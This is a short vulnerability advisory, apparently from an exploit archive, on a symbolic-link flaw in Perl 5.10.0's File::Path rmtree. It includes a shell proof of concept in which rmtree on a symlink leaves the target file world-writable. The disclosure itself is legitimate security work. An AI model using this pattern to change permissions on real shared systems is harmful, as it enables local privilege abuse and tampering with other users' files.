@@ -1,0 +1,17 @@
+source: http://www.securityfocus.com/bid/29902/info
+
+Computers running Perl are prone to a local vulnerability that occurs when handling symbolic links.
+
+Attackers can leverage this issue to change the permissions of arbitrary files.
+
+Perl 5.10.0 is vulnerable; other versions may also be affected.
+
+% touch foo
+% ln -s foo bar
+% ls -l foo bar
+lrwxrwxrwx 1 example example 3 2008-06-21 09:06 bar -> foo
+-rw-r--r-- 1 example example 0 2008-06-21 09:06 foo
+% perl -e 'use File::Path rmtree; rmtree bar'
+% ls -l foo bar
+ls: cannot access bar: No such file or directory
+-rwxrwxrwx 1 example example 0 2008-06-21 09:06 foo 
